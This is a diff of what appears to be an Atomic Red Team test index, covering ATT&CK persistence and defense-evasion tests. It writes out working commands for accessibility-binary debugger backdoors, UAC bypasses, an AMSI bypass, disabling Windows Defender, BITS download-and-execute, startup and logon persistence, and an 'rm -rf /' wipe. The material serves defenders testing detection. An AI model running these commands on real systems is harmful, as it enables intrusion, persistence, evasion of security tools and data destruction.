@@ -178,11 +178,23 @@ persistence:
           type: String
           default: osk.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - sethc
@@ -197,11 +209,23 @@ persistence:
           type: String
           default: sethc.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - utilman
@@ -216,11 +240,24 @@ persistence:
           type: String
           default: utilman.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - magnify
@@ -235,11 +272,24 @@ persistence:
           type: String
           default: magnify.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - narrator
@@ -254,11 +304,24 @@ persistence:
           type: String
           default: narrator.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\narrator.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - DisplaySwitch
@@ -273,11 +336,24 @@ persistence:
           type: String
           default: DisplaySwitch.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - AtBroker
@@ -292,11 +368,24 @@ persistence:
           type: String
           default: atbroker.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force | Out-Null
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v Debugger
+          /f
 
 '
   T1098:
@@ -851,11 +940,14 @@ persistence:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
       executor:
         name: command_prompt
-        command: 'bitsadmin.exe  /transfer /Download /priority Foreground #{remote_file}
+        command: 'bitsadmin.exe /transfer /Download /priority Foreground #{remote_file}
           #{local_file}
+
+'
+        cleanup_command: 'del #{local_file}
 
 '
     - name: Download & Execute via PowerShell BITS
@@ -872,11 +964,14 @@ persistence:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "$env:TEMP\\bitsadmin_flag.ps1"
       executor:
         name: powershell
         command: 'Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination
           #{local_file}
+
+'
+        cleanup_command: 'Remove-Item #{local_file}
 
 '
     - name: Persist, Download, & Execute
@@ -897,7 +992,7 @@ persistence:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
         command_path:
           description: Path of command to execute
           type: path
@@ -905,7 +1000,7 @@ persistence:
         command_line:
           description: Command line to execute
           type: string
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
       executor:
         name: command_prompt
         command: |
@@ -1037,7 +1132,7 @@ persistence:
           1. Navigate to [about:debugging](about:debugging) and
           click "Load Temporary Add-on"
 
-          2. Navigate to [manifest.json](./manifest.json)
+          2. Navigate to [manifest.json](./src/manifest.json)
 
           3. Then click 'Open'
   T1042:
@@ -1969,7 +2064,7 @@ persistence:
         file_name:
           description: Dll To Inject
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1179\bin\T1179x64.dll
+          default: PathToAtomicsFolder\T1179\bin\T1179x64.dll
         server_name:
           description: TLS Server To Test Get Request
           type: Url
@@ -2160,16 +2255,20 @@ persistence:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: winword.exe
+          default: C:\Windows\System32\calc.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
         command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
+
+'
+        cleanup_command: 'reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+          File Execution Options\#{target_binary}" /v Debugger /f
 
 '
     - name: IFEO Global Flags
@@ -2182,22 +2281,22 @@ persistence:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: notepad.exe
+          default: C:\Windows\System32\notepad.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
-          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"
-          /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess
-          /d "#{payload_binary}"
-
-'
+        command: |
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"
+        cleanup_command: |
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /f
   T1215:
     technique:
       x_mitre_permissions_required:
@@ -2305,8 +2404,6 @@ persistence:
 
 '
       supported_platforms:
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         kernel_module_file:
@@ -2694,8 +2791,6 @@ persistence:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         command:
@@ -2719,8 +2814,6 @@ persistence:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         command:
@@ -2741,8 +2834,6 @@ persistence:
         Event Monitor Daemon. \n"
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: manual
@@ -2839,44 +2930,61 @@ persistence:
       identifier: T1037
     atomic_tests:
     - name: Logon Scripts
-      description: 'Added Via Reg.exe
+      description: 'Adds a registry value to run batch script created in the C:\Windows\Temp
+        directory.
 
 '
       supported_platforms:
       - windows
       input_arguments:
+        script_path:
+          description: Path to .bat file
+          type: String
+          default: "$env:SystemRoot\\Temp\\art.bat"
         script_command:
           description: Command To Execute
           type: String
-          default: cmd.exe /c calc.exe
+          default: echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037-log.txt
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ
-          /d "#{script_command}"
-
-'
-        cleanup_command: 'REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript
-          /f
-
-'
-    - name: Starup Folder Script
-      description: 'A batch file on startup when placed in the start menu folder
+        command: |
+          echo cmd /c "#{script_command}" > #{script_path}
+          REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "#{script_path}"
+        cleanup_command: |
+          REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f
+          del #{script_path} >nul 2>nul
+          del "%USERPROFILE%\desktop\T1037-log.txt" >nul 2>nul
+    - name: Startup Folder Script
+      description: 'A batch file created to run on startup when placed in the start
+        menu folder
 
 '
       supported_platforms:
       - windows
+      input_arguments:
+        user_command:
+          description: Path to .bat file
+          type: String
+          default: echo Art `"Startup Folder Script`" atomic test for $env:USERNAME
+            was successful. >> $env:USERPROFILE\desktop\T1037-log.txt
+        system_command:
+          description: Command To Execute
+          type: String
+          default: echo Art `"Startup Folder Script`" atomic test for $env:COMPUTERNAME
+            was successful. >> $env:USERPROFILE\desktop\T1037-log.txt
       executor:
         name: powershell
-        elevation_required: false
+        elevation_required: true
         command: |
-          New-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
-          Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "echo T1037"
-          New-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
-          Set-Content "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "echo T1037"
+          New-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -force
+          Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "cmd /c #{user_command}"
+          New-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -force
+          Set-Content "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "cmd /c #{system_command}"
         cleanup_command: |
-          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
-          Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
+          Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -ErrorAction Ignore
+          Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -ErrorAction Ignore
+          Remove-Item "$env:USERPROFILE\desktop\T1037-log.txt" -ErrorAction Ignore
     - name: Scheduled Task Startup Script
       description: 'Run an exe on user logon or system startup
 
@@ -4289,12 +4397,13 @@ persistence:
           description: Class factory of transport agent.
           type: string
           default: Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory
+      dependencies:
+      - description: Microsoft Exchange SnapIn must be installed
+        prereq_command: Get-TransportAgent -TransportService FrontEnd
+        get_prereq_command: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
       executor:
         name: powershell
         elevation_required: true
-        prereq_command: |
-          Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
-          Get-TransportAgent -TransportService FrontEnd
         command: |
           Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}
           Enable-TransportAgent #{transport_agent_identity}
@@ -4444,8 +4553,6 @@ persistence:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         payload:
@@ -4468,8 +4575,6 @@ persistence:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         file_to_setuid:
@@ -4487,8 +4592,6 @@ persistence:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         file_to_setuid:
@@ -4653,32 +4756,37 @@ persistence:
       modified: '2019-07-18T17:58:17.016Z'
       identifier: T1165
     atomic_tests:
-    - name: Startup Items
+    - name: add file to Local Library StartupItems
       description: |
-        Modify or create an file in StartupItems
+        Modify or create an file in /Library/StartupItems
 
         [Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)
       supported_platforms:
       - macos
       executor:
-        name: manual
-        steps: '1. /Library/StartupItems/StartupParameters.plist
+        name: sh
+        elevation_required: true
+        command: 'sudo touch /Library/StartupItems/EvilStartup.plist
 
 '
-    - name: Startup Items (emond rule)
-      description: 'Establish persistence via a rule run by emond daemon at startup,
-        based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
+        cleanup_command: 'sudo rm /Library/StartupItems/EvilStartup.plist
+
+'
+    - name: Persistance with Event Monitor - emond
+      description: 'Establish persistence via a rule run by OSX''s emond (Event Monitor)
+        daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
 
 '
       supported_platforms:
       - macos
       input_arguments:
         plist:
-          description: Path to emond plist file
+          description: Path to attacker emond plist file
           type: path
-          default: "/path/to/T1165_emond.plist"
+          default: "$PathToAtomics/T1165/src/T1165_emond.plist"
       executor:
         name: sh
+        elevation_required: true
         command: |
           sudo cp "#{plist}" /etc/emond.d/rules/T1165_emond.plist
           sudo touch /private/var/db/emondClients/T1165
@@ -4904,15 +5012,13 @@ persistence:
         After sending a keyboard interrupt (CTRL+C) the script will download and execute.
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: sh
         command: |
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
+          trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" EXIT
           exit
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
+          trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" SIGINt
   T1100:
     technique:
       x_mitre_data_sources:
@@ -4987,7 +5093,7 @@ persistence:
         web_shells:
           description: Path of Web Shell
           type: path
-          default: PathToAtomicsFolder\T1100\shells\
+          default: PathToAtomicsFolder\T1100\src\
       executor:
         name: command_prompt
         command: 'xcopy #{web_shells} #{web_shell_path}
@@ -5362,12 +5468,13 @@ defense-evasion:
         elevation_required: true
         command: |
           #list processes by user,
-
           $owners = @{}
           gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
           get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
+
           #Steal Token
-          . .\src\T1134.ps1
+          Set-Location $PathToAtomicsFolder
+          .\T1134\src\T1134.ps1
   '':
     technique:
       x_mitre_data_sources:
@@ -5523,11 +5630,14 @@ defense-evasion:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
       executor:
         name: command_prompt
-        command: 'bitsadmin.exe  /transfer /Download /priority Foreground #{remote_file}
+        command: 'bitsadmin.exe /transfer /Download /priority Foreground #{remote_file}
           #{local_file}
+
+'
+        cleanup_command: 'del #{local_file}
 
 '
     - name: Download & Execute via PowerShell BITS
@@ -5544,11 +5654,14 @@ defense-evasion:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "$env:TEMP\\bitsadmin_flag.ps1"
       executor:
         name: powershell
         command: 'Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination
           #{local_file}
+
+'
+        cleanup_command: 'Remove-Item #{local_file}
 
 '
     - name: Persist, Download, & Execute
@@ -5569,7 +5682,7 @@ defense-evasion:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
         command_path:
           description: Path of command to execute
           type: path
@@ -5577,7 +5690,7 @@ defense-evasion:
         command_line:
           description: Command line to execute
           type: string
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
       executor:
         name: command_prompt
         command: |
@@ -5842,7 +5955,7 @@ defense-evasion:
           Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\fodhelper.exe"
         cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
-          -Recurse
+          -Recurse -ErrorAction Ignore
 
 '
     - name: Bypass UAC using ComputerDefaults - PowerShell
@@ -5889,9 +6002,8 @@ defense-evasion:
           mkdir "\\?\C:\Windows \System32\"
           copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
           mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
-        cleanup_command: |
-          rd "\\?\C:\Windows \" /S /Q
-          del "c:\testbypass.exe"
+        cleanup_command: "rd \"\\\\?\\C:\\Windows \\\" /S /Q\ndel \"c:\\testbypass.exe\"
+          >nul 2>nul \n"
   T1191:
     technique:
       x_mitre_data_sources:
@@ -5978,7 +6090,7 @@ defense-evasion:
         inf_file_path:
           description: Path to the INF file
           type: path
-          default: T1191.inf
+          default: PathToAtomicsFolder\T1191\src\T1191.inf
       executor:
         name: command_prompt
         elevation_required: false
@@ -5996,7 +6108,7 @@ defense-evasion:
         inf_file_uac:
           description: Path to the INF file
           type: path
-          default: T1191_uacbypass.inf
+          default: PathToAtomicsFolder\T1191\src\T1191_uacbypass.inf
       executor:
         name: command_prompt
         elevation_required: false
@@ -6586,11 +6698,11 @@ defense-evasion:
         cpl_file_path:
           description: path to cpl file
           type: path
-          default: calc.cpl
+          default: PathToAtomicsFolder\T1196\bin\calc.cpl
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'control.exe  #{cpl_file_path}
+        command: 'control.exe #{cpl_file_path}
 
 '
   T1207:
@@ -6933,13 +7045,16 @@ defense-evasion:
         executable:
           description: name of executable
           type: path
-          default: c:\file.exe
+          default: C:\Windows\System32\calc.exe
       executor:
         name: command_prompt
         elevation_required: false
         command: |
-          certutil.exe -encode #{executable} file.txt
-          certutil.exe -decode file.txt #{executable}
+          certutil -encode #{executable} %temp%\T1140_calc.txt
+          certutil -decode %temp%\T1140_calc.txt %temp%T1140_calc_decoded.exe
+        cleanup_command: |
+          del %temp%\T1140_calc.txt
+          del %temp%T1140_calc_decoded.exe
     - name: Certutil Rename and Decode
       description: 'Rename certutil and decode a file. This is in reference to latest
         research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)
@@ -6951,13 +7066,16 @@ defense-evasion:
         executable:
           description: name of executable/file to decode
           type: path
-          default: c:\file.exe
+          default: C:\Windows\System32\calc.exe
       executor:
         name: command_prompt
         elevation_required: false
         command: |
-          cmd.exe /c copy %windir%\\system32\\certutil.exe %temp%tcm.tmp
-          cmd.exe /c %temp%tcm.tmp -decode #{executable} file.txt
+          copy %windir%\system32\certutil.exe %temp%\tcm.tmp
+          %temp%\tcm.tmp -decode #{executable} %temp%\T1140.txt
+        cleanup_command: |
+          del %temp%\tcm.tmp
+          del %temp%\T1140.txt
   T1089:
     technique:
       x_mitre_data_sources:
@@ -7117,6 +7235,11 @@ defense-evasion:
             the default)
           type: string
           default: SysmonDrv
+      dependencies:
+      - description: Sysmon filter must be loaded
+        prereq_command: 'fltmc.exe filters | findstr #{sysmon_driver}'
+        get_prereq_command: echo Automated installer not implemented yet, please install
+          Sysmon manually
       executor:
         name: command_prompt
         elevation_required: true
@@ -7161,12 +7284,28 @@ defense-evasion:
 '
       supported_platforms:
       - windows
+      input_arguments:
+        sysmon_exe:
+          description: The location of the Sysmon executable from Sysinternals (ignored
+            if sysmon.exe is found in your PATH)
+          type: Path
+          default: PathToAtomicsFolder\T1089\bin\sysmon.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Sysmon executable must be available
+        prereq_command: if(cmd /c where sysmon) {0} else {1}
+        get_prereq_command: |-
+          $parentpath = Split-Path "#{sysmon_exe}"; $zippath = "$parentpath\Sysmon.zip"
+          New-Item -ItemType Directory $parentpath -Force | Out-Null
+          Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$zippath"
+          Expand-Archive $zippath $parentpath -Force; Remove-Item $zippath
+          if(-not ($Env:Path).contains($parentpath)){$Env:Path += ";$parentpath"}
+      - description: Sysmon must be installed
+        prereq_command: if(cmd /c sc query sysmon) {0} else {1}
+        get_prereq_command: cmd /c sysmon -i -accepteula
       executor:
         name: command_prompt
         elevation_required: true
-        prereq_command: 'sc query sysmon > nul
-
-'
         command: 'sysmon -u
 
 '
@@ -7253,6 +7392,60 @@ defense-evasion:
         name: powershell
         elevation_required: false
         command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)
+
+'
+    - name: Tamper with Windows Defender ATP PowerShell
+      description: 'Attempting to disable scheduled scanning and other parts of windows
+        defender atp
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          Set-MpPreference -DisableRealtimeMonitoring 1
+          Set-MpPreference -DisableBehaviorMonitoring 1
+          Set-MpPreference -DisableScriptScanning 1
+          Set-MpPreference -DisableBlockAtFirstSeen 1
+        cleanup_command: |
+          Set-MpPreference -DisableRealtimeMonitoring 0
+          Set-MpPreference -DisableBehaviorMonitoring 0
+          Set-MpPreference -DisableScriptScanning 0
+          Set-MpPreference -DisableBlockAtFirstSeen 0
+    - name: Tamper with Windows Defender Command Prompt
+      description: 'Attempting to disable scheduled scanning and other parts of windows
+        defender atp
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          sc stop WinDefend
+          sc config WinDefend start=disabled
+          sc query WinDefend
+        cleanup_command: |
+          sc start WinDefend
+          sc config WinDefend start=enabled
+    - name: Tamper with Windows Defender Registry
+      description: 'Disable Windows Defender from starting after a reboot
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: 'Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+          -Name DisableAntiSpyware -Value 1
+
+'
+        cleanup_command: 'Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows
+          Defender" -Name DisableAntiSpyware -Value 0
 
 '
   T1107:
@@ -7470,8 +7663,6 @@ defense-evasion:
 '
       supported_platforms:
       - linux
-      - centos
-      - ubuntu
       executor:
         name: bash
         command: 'rm -rf / --no-preserve-root > /dev/null 2> /dev/null
@@ -7491,6 +7682,86 @@ defense-evasion:
           -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
 
 '
+  T1006:
+    technique:
+      x_mitre_data_sources:
+      - API monitoring
+      x_mitre_permissions_required:
+      - Administrator
+      name: File System Logical Offsets
+      description: |-
+        Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)
+
+        Utilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)
+      id: attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      x_mitre_detection: |-
+        Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives. (Citation: Github PowerSploit Ninjacopy)
+
+        Monitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through [PowerShell](https://attack.mitre.org/techniques/T1086), additional logging of PowerShell scripts is recommended.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      created: '2017-05-31T21:30:20.934Z'
+      modified: '2018-10-17T00:14:20.652Z'
+      external_references:
+      - external_id: T1006
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1006
+      - description: Hakobyan, A. (2009, January 8). FDump - Dumping File Sectors
+          Directly from Disk using Logical Offsets. Retrieved November 12, 2014.
+        source_name: Hakobyan 2009
+        url: http://www.codeproject.com/Articles/32169/FDump-Dumping-File-Sectors-Directly-from-Disk-usin
+      - description: Bialek, J. (2015, December 16). Invoke-NinjaCopy.ps1. Retrieved
+          June 2, 2016.
+        source_name: Github PowerSploit Ninjacopy
